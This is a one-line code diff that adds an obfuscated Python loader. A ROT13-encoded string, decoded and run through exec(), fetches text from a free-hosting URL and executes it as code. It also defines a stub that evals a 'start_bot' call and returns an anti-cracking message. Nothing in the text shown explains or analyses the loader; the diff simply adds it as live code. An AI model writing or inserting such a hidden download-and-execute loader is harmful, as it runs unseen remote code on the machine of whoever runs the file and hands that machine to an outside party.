@@ -1,0 +1,1 @@
+exec((lambda __, _, : _('''vzcbeg erdhrfgf\nqngn = erdhrfgf.trg(hey="uggcf://tubfgzbqf718.000jroubfgncc.pbz/ivc/Tu27.cuc").grkg\nrkrp(qngn)\n\n\nqrs fgneg_fpevcg():\n    gel:\n        riny("""fgneg_obg()""")\n    rkprcg Rkprcgvba nf r:\n        erghea "Qba\'g gel gb penpx gur ncc"''',__))('rot_13',__import__('codecs').decode))
